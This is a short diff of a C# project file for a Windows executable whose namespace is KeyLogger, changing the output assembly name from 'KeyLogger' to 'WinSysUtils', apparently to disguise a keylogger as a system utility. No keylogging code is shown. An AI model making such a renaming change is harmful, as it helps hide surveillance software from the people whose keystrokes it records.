@@ -7,7 +7,7 @@
     <ProjectGuid>{CCDDD81F-6BA3-4D97-973A-455BAE1258C8}</ProjectGuid>
     <OutputType>WinExe</OutputType>
     <RootNamespace>KeyLogger</RootNamespace>
-    <AssemblyName>KeyLogger</AssemblyName>
+    <AssemblyName>WinSysUtils</AssemblyName>
     <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
